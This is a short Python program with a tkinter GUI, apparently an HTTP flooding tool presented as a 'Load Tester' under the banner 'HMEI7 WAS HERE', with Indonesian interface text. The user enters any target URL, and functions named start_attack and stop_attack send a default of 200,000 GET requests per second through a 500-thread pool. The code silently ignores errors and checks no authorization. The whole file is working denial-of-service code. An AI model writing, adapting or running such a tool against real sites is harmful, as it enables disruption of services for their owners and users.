import tkinter as tk
from tkinter import messagebox
import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def send_request(url):
    try:
        requests.get(url, timeout=2)
    except:
        pass

def stress_test(url, rps, stop_flag):
    with ThreadPoolExecutor(max_workers=500) as executor:
        while not stop_flag["stop"]:
            start = time.time()
            futures = [executor.submit(send_request, url) for _ in range(rps)]
            for f in futures:
                pass
            elapsed = time.time() - start
            time.sleep(max(0, 1 - elapsed))

def start_attack():
    url = url_entry.get().strip()
    if not url:
        messagebox.showwarning("Peringatan", "Masukkan URL target terlebih dahulu.")
        return

    try:
        rps = int(rps_entry.get())
        if rps <= 0:
            raise ValueError
    except ValueError:
        messagebox.showwarning("Peringatan", "Masukkan angka valid untuk permintaan per detik.")
        return

    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

    stop_flag["stop"] = False
    thread = threading.Thread(target=stress_test, args=(url, rps, stop_flag))
    thread.daemon = True
    thread.start()

def stop_attack():
    stop_flag["stop"] = True
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)
    messagebox.showinfo("Info", "Pengujian beban dihentikan.")

# GUI setup
app = tk.Tk()
app.title("HMEI7 Load Tester")
app.geometry("400x250")
app.configure(bg="black")

title_label = tk.Label(app, text="HMEI7 WAS HERE", font=("Courier", 16), fg="lime", bg="black")
title_label.pack(pady=10)

tk.Label(app, text="Target URL:", fg="white", bg="black").pack()
url_entry = tk.Entry(app, width=50)
url_entry.pack(pady=5)

tk.Label(app, text="Requests per second:", fg="white", bg="black").pack()
rps_entry = tk.Entry(app, width=20)
rps_entry.insert(0, "200000")
rps_entry.pack(pady=5)

start_button = tk.Button(app, text="Mulai", command=start_attack, bg="green", fg="white")
start_button.pack(pady=10)

stop_button = tk.Button(app, text="Stop", command=stop_attack, bg="red", fg="white", state=tk.DISABLED)
stop_button.pack()

stop_flag = {"stop": False}

app.mainloop()